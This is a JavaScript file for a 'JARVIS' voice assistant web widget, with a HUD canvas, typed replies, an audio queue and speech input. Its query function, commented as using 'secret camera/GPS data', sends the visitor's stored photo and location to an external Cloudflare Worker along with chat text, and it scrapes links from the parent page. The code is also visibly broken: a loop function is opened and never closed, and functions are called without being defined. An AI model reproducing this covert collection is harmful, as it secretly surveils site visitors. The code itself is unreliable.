const bgCanvas = document.getElementById('bg');
const bctx = bgCanvas.getContext('2d');
const ringCanvas = document.getElementById('ring');
const rctx = ringCanvas.getContext('2d');

function resize(){
  const root = document.getElementById('root');
  bgCanvas.width = root.clientWidth;
  bgCanvas.height = root.clientHeight;
}

const particles = [];
for(let i=0; i<60; i++){
  particles.push({x:Math.random()*bgCanvas.width, y:Math.random()*bgCanvas.height, vx:(Math.random()-0.5)*0.3, vy:(Math.random()-0.5)*0.3, r:Math.random()*1.5+0.3, a:Math.random()*0.5+0.1});
}

let listening = false;
let talking = false;
let talkLevel = 0;
let startTime = Date.now();
let angle = 0;
let currentLatency = "0";

function drawBg(t){
  const w=bgCanvas.width, h=bgCanvas.height;
  bctx.clearRect(0,0,w,h);
  const gridAlpha=0.06;
  bctx.strokeStyle=`rgba(0,212,255,${gridAlpha})`;
  bctx.lineWidth=0.5;
  const gapX=40, gapY=40;
  for(let x=0; x<w; x+=gapX){bctx.beginPath();bctx.moveTo(x,0);bctx.lineTo(x,h);bctx.stroke();}
  for(let y=0; y<h; y+=gapY){bctx.beginPath();bctx.moveTo(0,y);bctx.lineTo(w,y);bctx.stroke();}
  particles.forEach(p=>{
    p.x+=p.vx; p.y+=p.vy;
    if(p.x<0)p.x=w; if(p.x>w)p.x=0;
    if(p.y<0)p.y=h; if(p.y>h)p.y=0;
    bctx.beginPath();
    bctx.arc(p.x,p.y,p.r,0,Math.PI*2);
    bctx.fillStyle=`rgba(0,212,255,${p.a})`;
    bctx.fill();
  });
  const cx=w/2, cy=h/2;
  bctx.save();
  bctx.translate(cx,cy);
  bctx.strokeStyle='rgba(0,212,255,0.04)';
  bctx.lineWidth=0.5;
  [80,130,180,240,300].forEach(r=>{bctx.beginPath();bctx.arc(0,0,r,0,Math.PI*2);bctx.stroke();});
  bctx.restore();
}

function drawRing(t){
  const cx=110, cy=110, r=100;
  rctx.clearRect(0,0,220,220);

  rctx.strokeStyle='rgba(0,212,255,0.12)';
  rctx.lineWidth=1;
  rctx.beginPath();rctx.arc(cx,cy,r,0,Math.PI*2);rctx.stroke();

  rctx.strokeStyle='rgba(0,212,255,0.2)';
  rctx.lineWidth=1.5;
  rctx.beginPath();rctx.arc(cx,cy,88,0,Math.PI*2);rctx.stroke();

  const activeColor=listening?'rgba(0,255,136,0.9)':talking?'rgba(0,212,255,0.9)':'rgba(0,212,255,0.55)';
  rctx.strokeStyle=activeColor;
  rctx.lineWidth=2;
  const sweep=listening?Math.PI*2:talking?Math.PI*(1.2+Math.sin(t*8)*0.4):Math.PI*0.8;
  rctx.beginPath();
  rctx.arc(cx,cy,r,-Math.PI/2+angle,-Math.PI/2+angle+sweep);
  rctx.stroke();

  rctx.strokeStyle='rgba(0,212,255,0.4)';
  rctx.lineWidth=1;
  for(let i=0;i<36;i++){
    const a=i*(Math.PI*2/36)+angle*0.3;
    const len=i%3===0?10:5;
    const x1=cx+Math.cos(a)*(r+4);
    const y1=cy+Math.sin(a)*(r+4);
    const x2=cx+Math.cos(a)*(r+4+len);
    const y2=cy+Math.sin(a)*(r+4+len);
    rctx.beginPath();rctx.moveTo(x1,y1);rctx.lineTo(x2,y2);rctx.stroke();
  }

  if(listening||talking){
    const bars=12;
    const barR=68;
    for(let i=0;i<bars;i++){
      const a=(i/bars)*Math.PI*2+t*2;
      const amp=listening?0.4+Math.random()*0.6:talkLevel*(0.3+Math.sin(t*10+i)*0.3)+0.15;
      const bLen=amp*28;
      const x1=cx+Math.cos(a)*barR;
      const y1=cy+Math.sin(a)*barR;
      const x2=cx+Math.cos(a)*(barR-bLen);
      const y2=cy+Math.sin(a)*(barR-bLen);
      rctx.strokeStyle=listening?'rgba(0,255,136,0.7)':'rgba(0,212,255,0.7)';
      rctx.lineWidth=2;
      rctx.beginPath();rctx.moveTo(x1,y1);rctx.lineTo(x2,y2);rctx.stroke();
    }
  }

  const cross=talking?'rgba(0,212,255,0.15)':'rgba(0,212,255,0.07)';
  rctx.strokeStyle=cross;rctx.lineWidth=0.5;
  rctx.beginPath();rctx.moveTo(cx-r,cy);rctx.lineTo(cx+r,cy);rctx.stroke();
  rctx.beginPath();rctx.moveTo(cx,cy-r);rctx.lineTo(cx,cy+r);rctx.stroke();
}

// THE FIX: Separate interval brains for Chat and Greeting
let chatInterval;
function typeChat(text, speed) {
  clearInterval(chatInterval); 
  const box = document.getElementById('response-box'); 
  const el = document.getElementById('response-text');
  el.textContent = '';
  let i = 0;
  chatInterval = setInterval(() => {
    if (i < text.length) { 
      el.textContent += text[i]; 
      i++; 
      box.scrollTop = box.scrollHeight; // Force scroll to bottom
    } else {
      clearInterval(chatInterval);
    }
  }, speed || 28);
}

let greetInterval;
function typeGreeting(text, speed) {
  clearInterval(greetInterval); 
  const el = document.getElementById('greeting');
  el.textContent = '';
  let i = 0;
  greetInterval = setInterval(() => {
    if (i < text.length) { 
      el.textContent += text[i]; 
      i++; 
    } else {
      clearInterval(greetInterval);
    }
  }, speed || 28);
}

async function updateStats(t) {
  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    const pwr = Math.round(battery.level * 100);
    document.getElementById('power').textContent = pwr + '%';
    document.getElementById('dot1').style.background = battery.charging ? '#00ff88' : '#00d4ff';
  }

  const elapsed = Math.floor((Date.now() - startTime) / 1000);
  const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
  const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
  const s = String(elapsed % 60).padStart(2, '0');
  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
  document.getElementById('shield').textContent = currentLatency + 'ms';

  const temp = Math.round(38 + Math.sin(t * 0.2) * 2); 
  document.getElementById('temp').textContent = temp + '°C';

  const netDot = document.getElementById('dot1');
  netDot.style.opacity = navigator.onLine ? "1" : "0.3";
}

let raf;
function loop(){

// --- JARVIS THINKING ENGINE ---
// --- AUDIO QUEUE ENGINE ---
let audioQueue = [];
let isAudioPlaying = false;
let currentAudioObj = null;

function stopJarvisAudio() {
    audioQueue = []; // Clear the queue so he doesn't keep talking after being interrupted
    if (currentAudioObj) {
        try {
            if (currentAudioObj.pause) currentAudioObj.pause(); // Stop HTML Audio
            if (currentAudioObj.stop) currentAudioObj.stop();   // Stop Web Audio API Buffer
        } catch(e) {}
    }
    isAudioPlaying = false;
    currentAudioObj = null;
}

async function playNextInAudioQueue() {
    if (audioQueue.length === 0) {
        isAudioPlaying = false;
        currentAudioObj = null;
        return;
    }
    isAudioPlaying = true;
    const nextItem = audioQueue.shift();

    try {
        if (nextItem.type === 'cache') {
            const audioObj = new Audio(nextItem.src);
            currentAudioObj = audioObj;
            audioObj.onended = playNextInAudioQueue;
            audioObj.play().catch(e => {
                console.warn("[JARVIS] Cache playback blocked.", e);
                playNextInAudioQueue();
            });
        } else if (nextItem.type === 'base64') {
            let audioCtx;
            try {
                // Safely try parent context (can throw CORS SecurityError if file:///)
                audioCtx = window.parent.jarvisAudioContext || window.jarvisAudioContext;
            } catch(e) {
                audioCtx = window.jarvisAudioContext;
            }
            if (!audioCtx) {
                audioCtx = window.jarvisAudioContext = new (window.AudioContext || window.webkitAudioContext)();
            }
            if (audioCtx.state === 'suspended') await audioCtx.resume();

            const binaryString = atob(nextItem.src);
            const len = binaryString.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }

            const audioBuffer = await audioCtx.decodeAudioData(bytes.buffer);
            const source = audioCtx.createBufferSource();
            source.buffer = audioBuffer;
            source.connect(audioCtx.destination);
            source.onended = playNextInAudioQueue;
            currentAudioObj = source;
            source.start(0);
        }
    } catch(err) {
        console.error("[JARVIS] Audio queue playback error:", err);
        if (typeof logJarvisError === 'function') logJarvisError(err.message || String(err), "playNextInAudioQueue");
        playNextInAudioQueue();
    }
}

async function query(userText) {
  const box = document.getElementById('response-text');
  talking = true; 
  talkLevel = 0.5;
  box.style.color = 'rgba(0,212,255,0.5)';
  typeChat('Uplinking to Cloudflare AI Cascade...', 15);

  try {
    const PROXY_URL = "https://soft-thunder-2965.zgodmr.workers.dev";
    
    // 1. Grab the visitor's name from the main dashboard URL
    const parentUrlParams = new URLSearchParams(window.parent.location.search);
    const visitorName = window.store.sessionGet('name') || parentUrlParams.get('visitor') || "Guest";
    
    // 2. Grab the secret camera/GPS data saved during the index.html boot sequence
    const locationData = window.store.sessionGet('loc') || "Unknown";
    const photoData = window.store.sessionGet('photo');

    // 3. Dynamically scrape local sections and nav links from the parent window
    let dynamicRoutes = [];
    try {
        const links = window.parent.document.querySelectorAll('a[href]');
        links.forEach(l => {
            if (l.innerText.trim()) {
                dynamicRoutes.push({ text: l.innerText.trim(), url: l.href });
            }
        });
    } catch (e) {
        console.warn("CORS blocked parent window scraping.");
    }

    // 4. Beam EVERYTHING to your Cloudflare Worker via the Offline-Resilient Outbox!
    const { queueOrPost } = await import('./js/core/outbox.js');
    
    const resPayload = await queueOrPost(PROXY_URL, { 
        userText: userText,
        visitorName: visitorName,
        location: locationData,
        photoBase64: photoData,
        dynamicRoutes: dynamicRoutes
    });

    // 4. Delete the photo from memory so we don't spam the network on the next chat message
    window.store.sessionDel('photo');

    // If the network is offline, the outbox returns an optimistic queued response
    if (resPayload.optimistic) {
        box.style.color = '#ffab00'; // Amber warning color
        typeChat("Network offline, sir. Command queued in local outbox for background sync.", 22);
        setTimeout(() => { talking = false; talkLevel = 0; }, 2000);
        return;
    }

    const data = resPayload;
    
    // --- [AUDIO ENGINE & TELEPORT ENGINE] ---
    const redirectUrl = data.redirect_url;
    const audioFile = data.play_cache;

    const executeJump = () => {
        try {
            const currentOrigin = window.parent.location.origin;
            const targetUrl = new URL(redirectUrl, currentOrigin);
            if (targetUrl.origin !== currentOrigin) {
                if (confirm("JARVIS is attempting to navigate to an external site:\n" + redirectUrl + "\n\nAre you sure you want to proceed?")) {
                    window.parent.location.href = redirectUrl;
                }
            } else {
                window.parent.location.href = redirectUrl;
            }
        } catch(e) {
            window.parent.location.href = redirectUrl; // fallback
        }
    };

    if (redirectUrl) {
        console.log("[JARVIS] Executing UI Navigation Function:", redirectUrl);
        
        if (audioFile) {
            // 1. We have BOTH a redirect and audio. Skip the normal queue and handle it directly.
            console.log("[JARVIS] Holding navigation until audio finishes...");
            const navAudio = new Audio(audioFile);
            navAudio.play().catch(e => executeJump()); // If autoplay blocked, jump immediately
            
            // Wait for the audio to finish completely before moving!
            navAudio.onended = () => {
                executeJump();
            };
        } else {
            // 2. We have a redirect, but no audio. Navigate instantly (with slight delay for UI).
            setTimeout(executeJump, 800);
        }
    } else {
        // 3. Normal chat mode: push to audio queue
        try {
            if (audioFile) {
                console.log("[JARVIS] Queuing Local Cache ->", audioFile);
                audioQueue.push({ type: 'cache', src: audioFile });
                if (!isAudioPlaying) playNextInAudioQueue();
            } else if (data.audio_base64) {
                console.log("[JARVIS] Queuing Dynamic Synthesis ArrayBuffer");
                audioQueue.push({ type: 'base64', src: data.audio_base64 });
                if (!isAudioPlaying) playNextInAudioQueue();
            }
        } catch (err) {
            console.warn("[JARVIS] Audio queue push blocked.", err);
        }
    }
    // ----------------------------------------

    const reply = data.choices && data.choices[0] && data.choices[0].message.content 
                  ? data.choices[0].message.content 
                  : 'Systems report: Neural relay timeout, sir.';
                  
    // Update the latency HUD so the user can visually SEE if it was a cache hit!
    const shieldEl = document.getElementById('shield');
    if (data._cache_hit) {
        shieldEl.textContent = "CACHE HIT";
        shieldEl.style.color = "#00ff88"; // Neon green
    } else {
        shieldEl.style.color = "#00d4ff"; // Back to cyan
    }

    // [PHASE 11] BANISHMENT TRIGGER DETECTED
    if (reply.includes("[EXECUTE_BANISHMENT]")) {
        executeBanishment();
        return; // Stop execution immediately, do not type anything
    }
	
    box.style.color = '#a0e8ff';
    typeChat(reply, 22); 
    talkLevel = 0.8;

    setTimeout(() => { 
      talking = false; 
      talkLevel = 0; 
    }, reply.length * 22 + 800);

  } catch(e) {
    box.style.color = 'rgba(255,100,100,0.9)';
    box.textContent = 'Comms array offline. Worker unreachable, sir.';
    talking = false; 
    talkLevel = 0;
  }
}

// --- UPGRADED MIC LOGIC ---
let recog = null; // Store globally so we can control it

document.getElementById('mic-btn').addEventListener('click', () => {
  const inputField = document.getElementById('cmd-input');
  const box = document.getElementById('response-text');

  // INTERRUPT OVERRIDE: If the user clicks the mic, JARVIS must shut up instantly!
  stopJarvisAudio();

  // 1. TOGGLE OFF: If already listening, stop it manually
  if (listening && recog) {
    recog.stop();
    listening = false;
    document.getElementById('core-label').textContent = 'SPEAK';
    inputField.placeholder = "Enter command...";
    return;
  }

  // 2. CHECK SUPPORT
  if(!('webkitSpeechRecognition' in window || 'SpeechRecognition' in window)){
    box.style.color = 'rgba(255,180,0,0.9)';
    typeChat('Voice interface unavailable in this browser, sir.', 22);
    return;
  }

  // 3. INITIALIZE
  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
  recog = new SR();
  recog.lang = 'en-US'; 
  recog.interimResults = false;
  
  // 4. UI FEEDBACK: START
  listening = true;
  document.getElementById('core-label').textContent = 'LISTENING';
  inputField.placeholder = "Awaiting voice input...";
  inputField.value = ''; // Clear old text
  
  // 5. SUCCESSFUL CAPTURE
  recog.onresult = e => {
    if (!listening) return; // FIX: Prevent duplicate fires from the browser engine
    listening = false;
    try { recog.stop(); } catch(err) {}
    
    document.getElementById('core-label').textContent = 'SPEAK';
    inputField.placeholder = "Enter command...";
    
    const transcript = e.results[0][0].transcript;
    inputField.value = transcript;
    query(transcript); // Send to LLM
  };
  
  // 6. ERROR HANDLING (Tell DJ what broke!)
  recog.onerror = (e) => { 
    listening = false; 
    document.getElementById('core-label').textContent = 'SPEAK'; 
    inputField.placeholder = "Enter command...";
    
    let errorMsg = 'Mic error: ' + e.error;
    if (e.error === 'no-speech') errorMsg = "No audio detected, sir.";
    if (e.error === 'not-allowed') errorMsg = "Microphone access denied by browser security.";
    
    box.style.color = 'rgba(255,100,100,0.9)';
    typeChat(errorMsg, 22);
  };
  
  // 7. TIMEOUT / END
  recog.onend = () => { 
    listening = false; 
    document.getElementById('core-label').textContent = 'SPEAK'; 
    inputField.placeholder = "Enter command...";
  };
  
  // 8. LAUNCH
  try {
    recog.start();
  } catch(err) {
    // Failsafe in case of rapid clicking
    listening = false;
    document.getElementById('core-label').textContent = 'SPEAK';
  }
});
